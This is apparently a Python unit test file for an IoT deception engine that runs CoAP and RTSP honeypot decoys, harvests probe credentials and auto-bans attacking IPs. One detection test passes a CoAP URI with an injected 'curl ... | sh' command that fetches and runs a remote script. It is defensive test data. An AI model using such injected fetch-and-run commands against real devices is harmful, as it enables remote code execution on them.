"""Unit tests for Phase E: Multi-Protocol IoT Deception Decoy Engine (CoAP / RTSP)."""

import asyncio
import tempfile
import time
import unittest
from unittest.mock import MagicMock

from controller.core.db import DefenseDatabase
from controller.core.decoy_services import (
    CoAPDecoyProtocol,
    CoAPMessage,
    DecoyManager,
    RTSPDecoyProtocol,
)
from controller.core.detector import IntrusionDetector
from controller.mitigation.allowlist import AllowlistManager
from controller.mitigation.firewall import FirewallController


class TestCoAPProtocolAndDecoy(unittest.TestCase):
    """Verifies RFC 7252 CoAP parser, serializer, and honeypot datagram handlers."""

    def test_coap_message_from_bytes_and_to_bytes(self) -> None:
        # Create a CoAP GET request: Version=1, Type=0 (CON), TKL=0, Code=1 (GET), MsgID=0x1234
        # Uri-Path option (Option 11): length 17, value "/.well-known/core"
        # Option delta 11 (0xB), length 17 (0xD with extended byte 4)
        msg = CoAPMessage(
            version=1,
            msg_type=0,
            code=1,
            msg_id=0x1234,
            token=b"\xaa\xbb",
            uri_path="/sensors/temperature",
            payload='{"status": "query"}',
        )
        raw = msg.to_bytes()
        self.assertGreater(len(raw), 4)

        parsed = CoAPMessage.from_bytes(raw)
        self.assertIsNotNone(parsed)
        self.assertEqual(parsed.version, 1)
        self.assertEqual(parsed.msg_type, 0)
        self.assertEqual(parsed.code, 1)
        self.assertEqual(parsed.msg_id, 0x1234)
        self.assertEqual(parsed.token, b"\xaa\xbb")
        self.assertEqual(parsed.payload, '{"status": "query"}')

    def test_coap_message_malformed_returns_none(self) -> None:
        self.assertIsNone(CoAPMessage.from_bytes(b""))
        self.assertIsNone(CoAPMessage.from_bytes(b"\x40\x01"))

    def test_coap_decoy_protocol_dispatches_callback(self) -> None:
        callback = MagicMock()
        protocol = CoAPDecoyProtocol(on_probe_callback=callback)
        mock_transport = MagicMock()
        protocol.connection_made(mock_transport)

        # Build a CoAP message
        msg = CoAPMessage(
            version=1,
            msg_type=0,
            code=1,
            msg_id=42,
            token=b"",
            uri_path="/.well-known/core",
            payload="",
        )
        protocol.datagram_received(msg.to_bytes(), ("198.51.100.133", 56830))

        callback.assert_called_once_with("198.51.100.133", "/.well-known/core", "")
        self.assertTrue(mock_transport.sendto.called)


class TestRTSPProtocolAndDecoy(unittest.TestCase):
    """Verifies RFC 2326 RTSP camera decoy responses and credential harvesting."""

    def test_rtsp_options_and_describe(self) -> None:
        callback = MagicMock()
        protocol = RTSPDecoyProtocol(on_rtsp_callback=callback)
        mock_transport = MagicMock()
        mock_transport.get_extra_info.return_value = ("198.51.100.200", 55400)
        protocol.connection_made(mock_transport)

        # 1. Send OPTIONS request
        options_req = b"OPTIONS * RTSP/1.0\r\nCSeq: 1\r\n\r\n"
        protocol.data_received(options_req)
        self.assertTrue(mock_transport.write.called)
        last_resp = mock_transport.write.call_args[0][0].decode()
        self.assertIn("RTSP/1.0 200 OK", last_resp)
        self.assertIn("Public: OPTIONS, DESCRIBE", last_resp)

        # 2. Send DESCRIBE with Basic credentials
        # admin:supersecret -> base64: YWRtaW46c3VwZXJzZWNyZXQ=
        describe_req = (
            b"DESCRIBE rtsp://127.0.0.1:8554/live.sdp RTSP/1.0\r\n"
            b"CSeq: 2\r\n"
            b"Authorization: Basic YWRtaW46c3VwZXJzZWNyZXQ=\r\n\r\n"
        )
        protocol.data_received(describe_req)
        callback.assert_called_with("198.51.100.200", "DESCRIBE", "rtsp://127.0.0.1:8554/live.sdp", "User: admin, Pass: supersecret")


class TestDetectorCoAPEvaluation(unittest.TestCase):
    """Verifies IntrusionDetector evaluation of CoAP reconnaissance sweeps and exploits."""

    def setUp(self) -> None:
        self.temp_dir = tempfile.TemporaryDirectory()
        self.db = DefenseDatabase(db_path=f"{self.temp_dir.name}/coap_test.db")
        self.allowlist = AllowlistManager()
        self.firewall = FirewallController(allowlist_manager=self.allowlist, dry_run=True)
        self.detector = IntrusionDetector(
            firewall=self.firewall,
            db=self.db,
            allowlist=self.allowlist,
            time_window_seconds=30.0,
        )

    def tearDown(self) -> None:
        self.temp_dir.cleanup()

    def test_evaluate_coap_critical_exploit(self) -> None:
        rec = self.detector.evaluate_coap_probe(
            src_ip="198.51.100.133",
            uri_path="/sensors/actuator?cmd=curl%20-s%20http://malicious.sh|sh",
        )
        self.assertIsNotNone(rec)
        self.assertEqual(rec.action, "IPTABLES_DROP")
        self.assertEqual(rec.severity, "CRITICAL")
        self.assertTrue(self.firewall.is_ip_banned("198.51.100.133"))

    def test_evaluate_coap_reconnaissance_sweep(self) -> None:
        attacker_ip = "198.51.100.168"
        uris = [
            "/.well-known/core",
            "/sensors/temperature",
            "/sensors/humidity",
            "/sensors/pressure",
            "/sensors/light",
        ]
        # Probes 1-4 should not trigger a ban
        for u in uris[:4]:
            rec = self.detector.evaluate_coap_probe(src_ip=attacker_ip, uri_path=u)
            self.assertIsNone(rec)
            self.assertFalse(self.firewall.is_ip_banned(attacker_ip))

        # 5th probe within time window triggers autonomous ban
        rec = self.detector.evaluate_coap_probe(src_ip=attacker_ip, uri_path=uris[4])
        self.assertIsNotNone(rec)
        self.assertEqual(rec.action, "IPTABLES_DROP")
        self.assertEqual(rec.severity, "HIGH")
        self.assertTrue(self.firewall.is_ip_banned(attacker_ip))

    def test_evaluate_coap_protected_ip_not_banned(self) -> None:
        rec = self.detector.evaluate_coap_probe(
            src_ip="127.0.0.1",
            uri_path="/sensors/actuator?cmd=curl",
        )
        self.assertIsNone(rec)
        self.assertFalse(self.firewall.is_ip_banned("127.0.0.1"))


class TestDecoyManagerLifecycle(unittest.IsolatedAsyncioTestCase):
    """Verifies DecoyManager start and stop lifecycle."""

    async def test_decoy_manager_start_and_stop(self) -> None:
        # Use high unprivileged ports for unit testing
        manager = DecoyManager(coap_port=15683, rtsp_port=18554)
        await manager.start()
        self.assertTrue(manager.is_running)

        manager.stop()
        self.assertFalse(manager.is_running)


if __name__ == "__main__":
    unittest.main()
